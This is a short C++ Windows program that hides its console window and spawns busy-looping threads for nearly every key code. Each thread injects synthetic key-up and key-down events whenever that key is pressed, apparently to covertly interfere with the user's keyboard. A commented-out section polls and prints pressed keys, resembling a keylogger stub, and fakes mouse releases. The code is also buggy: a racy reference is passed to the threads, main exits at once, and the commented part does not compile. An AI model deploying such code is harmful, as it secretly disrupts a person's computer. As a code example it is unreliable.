#include <bits/stdc++.h>
#include <windows.h>
// #include <dir.h>
#include <conio.h>
#include <sys/stat.h>
#include <shlwapi.h>
#include <thread>
#include <dirent.h>
#include <vector>
#include <cstring>
#pragma comment(lib, "Shlwapi.lib")
#define Down(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1 : 0)
using namespace std;

int pid1 = -1, pid2 = -1, kbd;
inline bool exists(const string name)
{
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}
WINBOOL HideConsole()
{
    HWND hwndc = GetConsoleWindow();
    return ShowWindow(hwndc, SW_HIDE);
}
void getkbd(int i)
{
    while (1)
    {
        if (Down(i))
        {
            keybd_event(i, i, KEYEVENTF_KEYUP, 0);
            keybd_event(i, i, 0, 0);
            keybd_event(i, i, KEYEVENTF_KEYUP, 0);
        }
    }
}
int main()
{
    HideConsole();
    for (int i = 1; i <= 254; ++i)
    {
        thread s(getkbd, ref(i));
        s.detach();
    }
    /*
    pid1 = getpid();
    int i;
    while (pid2 != pid1)
    {
        i = kbd;
    }
        kbd = i;
        pid2 = pid1;
    while (1)
    {
        for (int i = 1; i <= 254; ++i)
        {
            thread s = (getkbd,i);
            s.detach();
            if (Down(i))
            {
                cout << i;
            }
        }
    }
    while (1)
    {
        if (Down(VK_LBUTTON))
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        mouse_event(GetAsyncKeyState(), 0, 0, 0, 0);
    }
    */
    return 0;
}